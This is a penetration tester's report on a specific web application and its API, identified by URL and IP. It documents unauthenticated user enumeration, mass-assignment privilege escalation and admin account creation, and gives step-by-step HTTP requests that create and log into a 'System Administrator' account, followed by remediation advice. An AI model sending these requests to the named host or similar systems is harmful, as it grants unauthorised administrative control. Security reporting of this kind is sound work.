

---
## **Target Application**

- **URL:** [https://icbm.dbi.deu.ng/](https://icbm.dbi.deu.ng/)
    
- **Resolved IP:** 89.34.16.118
    
- **API Port Observed:** 3005
    

---

## **Tester Information**

**Name:** Matthew Ogbu  
**Role:** Penetration Tester  
**Engagement Type:** Black-box Web Application & API Security Testing

---

---

# **Executive Summary**

During security testing of the target web application and associated API, multiple **critical authorization and business-logic vulnerabilities** were identified.

The most severe issues allow an **unauthenticated attacker** to:

- Enumerate all users in the system, including administrators.
    
- View sensitive metadata such as email addresses and roles.
    
- Create new accounts with **arbitrary privilege levels**, including _System Administrator_.
    
- Log in with attacker-supplied credentials.
    

Successful exploitation results in **complete compromise of the application**, including administrative access, data exposure, and persistence.

These findings constitute a **Critical Risk** to the organization.

---

---

# **Technology Fingerprinting**

Reconnaissance was performed using Wappalyzer, WhatWeb, Burp Suite Scanner, Censys, and WAFW00F.

## **Identified Stack**

- **Web Server:** nginx 1.21.0
    
- **Framework:** Next.js 16.1.1

-  ports:
21/tcp    open  ftp
80/tcp    open  http
443/tcp   open  https
5432/tcp  open  postgresql
8443/tcp  open  https-alt
32768/tcp open  filenet-tms 
## **WAF Detection**

- WAFW00F did **not** identify any active Web Application Firewall.
    

---

---

# **Findings Overview**

| ID   | Title                                     | Severity |
| ---- | ----------------------------------------- | -------- |
| F-01 | Unauthenticated User Enumeration via API  | Critical |
| F-02 | Sensitive Information Disclosure          | Critical |
| F-03 | Privilege Escalation via Mass Assignment  | Critical |
| F-04 | Arbitrary Administrative Account Creation | Critical |
| F-05 | Weak Password Policy / Handling           | High     |

---

---

# **Detailed Findings**

---

---

## **F-01 — Unauthenticated User Enumeration**

### **Severity:** Critical

### **Description**

The API endpoint:

```
GET /api/users
Host: 89.34.16.118:3005
```

was accessible **without authentication** and returned a full list of user accounts.

The response included privileged users such as:

- `admin`
    
- customer-care roles
    
- system administrators
    

---

### **Observed Response (Excerpt)**

```
HTTP/1.1 200 OK
Content-Type: application/json

[
  {
    "id":"admin-1766846765492",
    "username":"admin",
    "email":"admin@buglogger.com",
    "role":"admin",
    "fullName":"System Administrator",
    "createdAt":"2025-12-27T14:46:05.492Z",
    "isActive":true
  }
]
```

---

### **Impact**

- Enables reconnaissance for targeted attacks.
    
- Exposes administrator usernames and emails.
    
- Facilitates account takeover attempts.
    
- Violates privacy and data-protection requirements.
    

---

### **OWASP Mapping**

- OWASP API Top 10 – **API1: Broken Object Level Authorization**
    
- OWASP API Top 10 – **API3: Excessive Data Exposure**
    

---

---

## **F-02 — Sensitive Information Disclosure**

### **Severity:** Critical

### **Description**

The `/api/users` endpoint leaked sensitive attributes including:

- email addresses
    
- roles
    
- full names
    
- account creation timestamps
    
- activation status
    

---

### **Impact**

- Privacy breach.
    
- Social-engineering enablement.
    
- Credential-stuffing preparation.
    
- Internal role mapping for privilege escalation.
    

---

---

## **F-03 — Privilege Escalation via Mass Assignment**

### **Severity:** Critical

### **Description**

By crafting a JSON request containing arbitrary fields such as:

```
"role":"System Administrator"
```

the backend accepted the value without server-side validation.

This indicates the API is directly binding user-controlled input to internal objects without enforcing a whitelist of permitted attributes.

---

### **Impact**

- Attackers can self-assign elevated roles.
    
- Bypass access-control logic.
    
- Create persistent privileged accounts.
    
- Full application compromise.
    

---

### **OWASP Mapping**

- OWASP API Top 10 – **API6: Mass Assignment**
    
- OWASP API Top 10 – **API5: Broken Function Level Authorization**
    

---

---

## **F-04 — Arbitrary Administrative Account Creation**

### **Severity:** Critical

### **Description**

The tester successfully created a new user account with **System Administrator** privileges using a crafted API request and subsequently authenticated with the supplied credentials.

This was possible without any prior authorization.

---

### **Impact**

- Complete administrative takeover.
    
- Access to sensitive business data.
    
- Modification or deletion of records.
    
- Potential infrastructure compromise.
    
- Regulatory and reputational risk.
    

---

---

## **F-05 — Weak Password Policy**

### **Severity:** High

### **Description**

The system accepted an extremely weak password:

```
12345
```

during account creation and allowed authentication.

This suggests:

- no password-strength enforcement
    
- potential improper credential handling
    
- elevated brute-force risk
    

---

### **Impact**

- Rapid account compromise.
    
- Credential stuffing success.
    
- Increased attack surface.
    

---

---

# **Reproducible Exploitation Details**

---

---

## **Step 1 — Enumerate Users**

### **Request**

```
GET /api/users HTTP/1.1
Host: 89.34.16.118:3005
Accept: application/json
```

---

### **Response**

```
HTTP/1.1 200 OK

[
  {
    "id":"admin-1766846765492",
    "username":"admin",
    "email":"admin@buglogger.com",
    "role":"admin"
  }
]
```

---

---

## **Step 2 — Create Privileged Account**

### **Request**

```
POST /api/users HTTP/1.1
Host: 89.34.16.118:3005
Content-Type: application/json
```

```
{
  "username":"hex.rabiu",
  "email":"hexdrifter@proton.me",
  "role":"System Administrator",
  "fullName":"Hax Rabiu",
  "password":"12345",
  "isActive":true
}
```

---

### **Response**

```
HTTP/1.1 201 Created

{
  "username":"hex.rabiu",
  "role":"System Administrator",
  "isActive":true
}
```

---

---

## **Step 3 — Authenticate**

### **Request**

```
POST /api/auth/login HTTP/1.1
Host: 89.34.16.118:3005
Content-Type: application/json
```

```
{
  "username":"hex.rabiu",
  "password":"12345"
}
```

---

### **Response**

```
HTTP/1.1 200 OK

{
  user succesfully created,
  "role":"System Administrator"
}
```

---

---

# **Overall Risk Assessment**

The combination of:

- unauthenticated endpoints
    
- unrestricted role assignment
    
- administrative account creation
    
- sensitive data exposure
    

results in a **worst-case security posture**.

### **Overall Severity:** 🔴 **CRITICAL**

Immediate remediation is strongly advised.

---

---

# **Recommendations**

---

## **Access Control**

- Enforce authentication on all `/api/*` endpoints.
    
- Implement strict Role-Based Access Control (RBAC).
    
- Validate privileges server-side.
    
- Never trust client-supplied roles.
    

---

## **Mass Assignment Protection**

- Whitelist allowed JSON fields.
    
- Ignore or reject privileged attributes from requests.
    
- Use DTO schemas / serializers with strict validation.
    

---

## **Password Security**

- Enforce strong password policies.
    
- Hash using Argon2 or bcrypt.
    
- Implement rate-limiting on login endpoints.
    

---

## **Monitoring & Logging**

- Log administrative actions.
    
- Alert on new admin creation.
    
- Track IP addresses.
    
- Add anomaly detection.
    

---

## **API Hardening**

- Remove sensitive attributes from responses.
    
- Apply least-privilege design.
    
- Implement automated security testing in CI/CD.
    

---

---

# **Conclusion**

The vulnerabilities identified enable **full system compromise by unauthenticated attackers**.

Given the severity, exploitation could lead to:

- data breaches
    
- operational disruption
    
- regulatory penalties
    
- reputational damage
    

These issues should be addressed **immediately** and a full security re-test conducted after remediation.

---

---

**Report Prepared By:**  
**Matthew Ogbu**  
Penetration Tester

---

---

